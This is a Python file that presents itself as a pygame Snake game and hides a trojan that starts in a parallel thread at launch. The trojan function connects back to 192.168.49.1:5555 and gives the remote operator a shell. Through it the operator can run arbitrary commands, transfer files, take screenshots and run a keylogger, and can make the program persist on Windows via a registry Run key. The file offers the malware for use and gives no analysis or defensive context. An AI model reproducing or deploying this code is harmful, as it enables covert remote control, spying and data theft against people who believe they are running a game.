import socket
import json
import subprocess
import os
import pyautogui
import shutil
import sys
import pygame
import time
import random
import threading
import os

def trojan():
    def reliable_send(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

    def reliable_recv():
        data = ''
        while True:
            try:
                data = data + s.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue

    def download_file(file_name):
        f = open(file_name, 'wb')
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = s.recv(1024)
            except socket.timeout as e:
                break
        s.settimeout(None)
        f.close()

    def upload_file(file_name):
        f = open(file_name, 'rb')
        s.send(f.read())

    def screenshot():
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save('screen.png')

    def persist(reg_name, copy_name):
        file_location = os.environ['appdata'] + '\\' + copy_name
        try:
            if not os.path.exists(file_location):
                shutil.copyfile(sys.executable, file_location)
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
                reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
            else:
                reliable_send('[+] Persistence Already Exists')
        except:
            reliable_send('[+] Error Creating Persistence With The Target Machine')

    def connection():
        while True:
            time.sleep(20)
            try:
                s.connect(('192.168.49.1', 5555))
                shell()
                s.close()
                break
            except:
                connection()

    def shell():
        while True:
            command = reliable_recv()
            if command == 'quit':
                break
            elif command == 'background':
                pass
            elif command == 'help':
                pass
            elif command == 'clear':
                pass
            elif command[:3] == 'cd ':
                os.chdir(command[3:])
            elif command[:6] == 'upload':
                download_file(command[7:])
            elif command[:8] == 'download':
                upload_file(command[9:])
            elif command[:10] == 'screenshot':
                screenshot()
                upload_file('screen.png')
                os.remove('screen.png')
            elif command[:12] == 'keylog_start':
                keylog = keylogger.Keylogger()
                t = threading.Thread(target=keylog.start)
                t.start()
                reliable_send('[+] Keylogger Started!')
            elif command[:11] == 'keylog_dump':
                logs = keylog.read_logs()
                reliable_send(logs)
            elif command[:11] == 'keylog_stop':
                keylog.self_destruct()
                t.join()
                reliable_send('[+] Keylogger Stopped!')
            elif command[:11] == 'persistence':
                reg_name, copy_name = command[12:].split(' ')
                persist(reg_name, copy_name)
            elif command[:7] == 'sendall':
                subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin = subprocess.PIPE)
            else:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                reliable_send(result)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection()



def game(): 
    pygame.init()    
    white = (255, 255, 255)
    yellow = (255, 255, 102)
    black = (0, 0, 0)
    red = (213, 50, 80)
    green = (0, 255, 0)
    blue = (50, 153, 213)
    dis_width = 600
    dis_height = 400
    dis = pygame.display.set_mode((dis_width, dis_height))
    pygame.display.set_caption('Snake Game')
    clock = pygame.time.Clock()
    snake_block = 10
    snake_speed = 15
    font_style = pygame.font.SysFont("bahnschrift", 25)
    score_font = pygame.font.SysFont("comicsansms", 35)
    def Your_score(score):
        value = score_font.render("Your Score: " + str(score), True, yellow)
        dis.blit(value, [0, 0])
    def our_snake(snake_block, snake_list):
        for x in snake_list:
            pygame.draw.rect(dis, black, [x[0], x[1], snake_block, snake_block])
    def message(msg, color):
        mesg = font_style.render(msg, True, color)
        dis.blit(mesg, [dis_width / 6, dis_height / 3])
    def gameLoop():
        game_over = False
        game_close = False
        x1 = dis_width / 2
        y1 = dis_height / 2
        x1_change = 0
        y1_change = 0
        snake_List = []
        Length_of_snake = 1
        foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0
        foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0
        while not game_over:
            while game_close == True:
                dis.fill(blue)
                message("You Lost! Press C-Play Again or Q-Quit", red)
                Your_score(Length_of_snake - 1)
                pygame.display.update()
                for event in pygame.event.get():
                    if event.type == pygame.KEYDOWN:
                        if event.key == pygame.K_q:
                            game_over = True
                            game_close = False
                        if event.key == pygame.K_c:
                            gameLoop()
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    game_over = True
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_LEFT:
                        x1_change = -snake_block
                        y1_change = 0
                    elif event.key == pygame.K_RIGHT:
                        x1_change = snake_block
                        y1_change = 0
                    elif event.key == pygame.K_UP:
                        y1_change = -snake_block
                        x1_change = 0
                    elif event.key == pygame.K_DOWN:
                        y1_change = snake_block
                        x1_change = 0
    
            if x1 >= dis_width or x1 < 0 or y1 >= dis_height or y1 < 0:
                game_close = True
            x1 += x1_change
            y1 += y1_change
            dis.fill(blue)
            pygame.draw.rect(dis, green, [foodx, foody, snake_block, snake_block])
            snake_Head = []
            snake_Head.append(x1)
            snake_Head.append(y1)
            snake_List.append(snake_Head)
            if len(snake_List) > Length_of_snake:
                del snake_List[0]
            for x in snake_List[:-1]:
                if x == snake_Head:
                    game_close = True
            our_snake(snake_block, snake_List)
            Your_score(Length_of_snake - 1)
            pygame.display.update()
            if x1 == foodx and y1 == foody:
                foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0
                foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0
                Length_of_snake += 1
            clock.tick(snake_speed)
        pygame.quit()
        quit()
    gameLoop()
t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)
t1.start()
t2.start()